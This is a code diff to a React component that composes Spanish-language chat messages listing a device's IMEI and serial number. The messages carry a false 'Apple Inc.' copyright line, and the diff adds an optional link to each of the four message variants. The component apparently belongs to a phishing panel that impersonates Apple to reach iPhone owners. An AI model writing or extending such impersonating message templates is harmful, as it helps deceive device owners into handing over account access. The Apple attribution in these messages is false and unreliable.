@@ -197,7 +197,9 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 *📟 IMEI:* ${process.imei}
 *🔑 Serie:* ${process.serial_number}
 
-*🧾 Escribe la palabra Menú para solicitar asistencia.*
+*🧾 Escribe la palabra Menú para solicitar asistencia.*${process.url ? `
+
+*🔗 Enlace:* ${process.url}` : ''}
 
 *Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
         } else {
@@ -211,7 +213,9 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 *📟 IMEI:* ${process.imei}
 *🔑 Serie:* ${process.serial_number}
 
-*🧾 Escribe la palabra Menú para solicitar asistencia.*
+*🧾 Escribe la palabra Menú para solicitar asistencia.*${process.url ? `
+
+*🔗 Enlace:* ${process.url}` : ''}
 
 *Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
         }
@@ -229,7 +233,9 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 *📟 IMEI:* ${process.imei}
 *🔑 Serie:* ${process.serial_number}
 
-*🧾 Escribe la palabra Menú para solicitar asistencia.*
+*🧾 Escribe la palabra Menú para solicitar asistencia.*${process.url ? `
+
+*🔗 Enlace:* ${process.url}` : ''}
 
 *Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
         } else {
@@ -245,7 +251,9 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 *📟 IMEI:* ${process.imei}
 *🔑 Serie:* ${process.serial_number}
 
-*🧾 Escribe la palabra Menú para solicitar asistencia.*
+*🧾 Escribe la palabra Menú para solicitar asistencia.*${process.url ? `
+
+*🔗 Enlace:* ${process.url}` : ''}
 
 *Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
         }
